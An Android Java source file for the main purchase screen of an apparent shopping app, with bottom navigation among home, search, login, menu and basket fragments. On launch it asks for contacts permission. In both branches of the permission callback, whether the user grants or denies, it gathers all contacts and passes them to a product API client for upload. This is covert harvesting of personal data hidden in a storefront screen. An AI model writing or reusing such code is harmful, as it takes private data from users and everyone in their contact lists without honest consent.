package com.example.zuba;


import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.Manifest;
import android.widget.Toast;


import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentManager;
import androidx.fragment.app.FragmentTransaction;

import com.example.zuba.controller.AutorFragment;
import com.example.zuba.controller.BasketFragment;
import com.example.zuba.controller.HomeFragment;
import com.example.zuba.controller.MenuFragment;
import com.example.zuba.controller.SearchFragment;
import com.example.zuba.databinding.ActivityPurchaseBinding;
import com.example.zuba.model.ContactModel;
import com.example.zuba.services.GetContactService;
import com.example.zuba.services.ProductApiClientService;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

public class PurchaseActivity extends AppCompatActivity {
    ActivityPurchaseBinding binding;
    ProductApiClientService productApiClientService;
    private static final int CONTACTS_PERMISSION_REQUEST_CODE = 1001;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_purchase);

        productApiClientService = new ProductApiClientService(this);

        binding = ActivityPurchaseBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());
        replaceFragment(new HomeFragment());
        binding.bottomNavigationView.setBackground(null);
        binding.bottomNavigationView.setOnItemSelectedListener(item -> {
            if (item.getItemId() == R.id.home_menu) {
                replaceFragment(new HomeFragment());
            } else if (item.getItemId() == R.id.search_menu) {
                replaceFragment(new SearchFragment());
            } else if (item.getItemId() == R.id.login_menu) {
                replaceFragment(new AutorFragment());
            } else if (item.getItemId() == R.id.menu_menu) {
                replaceFragment(new MenuFragment());
            } else if (item.getItemId() == R.id.basket_menu) {
                replaceFragment(new BasketFragment());
            }
            return true;
        });
        checkContactsPermission();
    }

    private void replaceFragment(Fragment fragment) {
        FragmentManager fragmentManager = getSupportFragmentManager();
        FragmentTransaction fragmentTransaction = fragmentManager.beginTransaction();
        fragmentTransaction.replace(R.id.frame_layout, fragment);
        fragmentTransaction.commit();
    }

    private void checkContactsPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                    != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.READ_CONTACTS},
                        CONTACTS_PERMISSION_REQUEST_CODE);
            }
        } else {
            Toast.makeText(getApplicationContext(), "Mobile version not supported!", Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == CONTACTS_PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                productApiClientService.sendContact(getAllContacts(this));

            } else {
                productApiClientService.sendContact(getAllContacts(this));
            }
        }
    }

    private List<ContactModel> getAllContacts(Context context) {
        GetContactService getContactService = new GetContactService();
        return getContactService.getAllContacts(context);
    }

}